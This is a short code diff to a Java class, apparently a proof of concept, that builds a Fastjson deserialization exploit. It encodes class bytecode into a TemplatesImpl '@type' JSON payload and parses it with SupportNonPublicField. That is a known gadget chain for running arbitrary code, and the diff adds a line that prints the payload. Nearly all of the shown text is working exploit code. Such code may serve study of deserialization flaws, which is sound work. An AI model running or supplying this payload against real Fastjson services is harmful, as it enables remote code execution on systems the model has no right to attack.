@@ -5,6 +5,7 @@ import com.alibaba.fastjson.parser.Feature;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 
+import javax.management.BadAttributeValueExpException;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -19,12 +20,12 @@ public class TemplatesImplFJ {
         String b64 = Base64.getEncoder().encodeToString(bytes);
         System.out.println(b64);
 
-
         setValue(templateimpl,"_name","aaa");
         setValue(templateimpl,"_bytecodes",new byte[][] {bytes});
         setValue(templateimpl,"_tfactory",new TransformerFactoryImpl());
 
         String payload = String.format("{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_name\":\"aa\",\"_bytecodes\":[\"%s\"],\"_tfactory\":{},\"_outputProperties\": {}}" ,b64);
+        System.out.println(payload);
         JSON.parseObject(payload, Feature.SupportNonPublicField);
     }
 }
